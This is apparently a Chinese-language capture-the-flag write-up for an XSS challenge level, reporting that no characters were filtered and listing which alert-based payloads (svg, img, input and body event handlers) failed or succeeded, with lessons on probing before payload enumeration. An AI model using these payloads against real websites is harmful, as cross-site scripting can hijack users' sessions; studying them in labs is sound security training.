### 关键观察

**1. 逐字符探测：94 个可打印字符全部原样保留。**

```text
altered: []
```

没有字符级过滤，也没有空白删除、没有标签剥离。

**2. 但同族的常规 payload 大多失效。**

| payload | 结果 |
| --- | --- |
| `<svg onload=alert("XSS")>` | 失败 |
| `<svg/onload=alert("XSS")>` | 失败 |
| `<img src=x onerror=alert("XSS")>` | 失败 |
| `<input autofocus onfocus=alert("XSS")>` | 失败 |
| **`<body onload=alert("XSS")>`** | **Congratulations** |

## 复盘

- **"无过滤" 不等于 "随便一个 payload 都行"。** 这关字符全放行，
  但 `svg`/`img`/`input` 的自动化触发全部失败，只有 `body onload` 通过。
  说明评测端对「何时算触发」有额外判定（很可能只接受文档级 `onload`）。
- **同族经验不能盲用。** 004/008 用 `autofocus+onfocus`、046 用 `svg onload`、
  010 用 JSFuck——每关的有效触发点都不一样，必须实测。
- **先做逐字符探测，再做 payload 枚举。** 知道「没有字符过滤」之后，
  就不用再想编码绕过，只需在少量标签/事件组合里找可行的那一组。
- **`body onload` 是最稳的触发方式之一**：它不等任何资源、不需要交互、
  也不需要特定元素语义，文档一加载就执行。
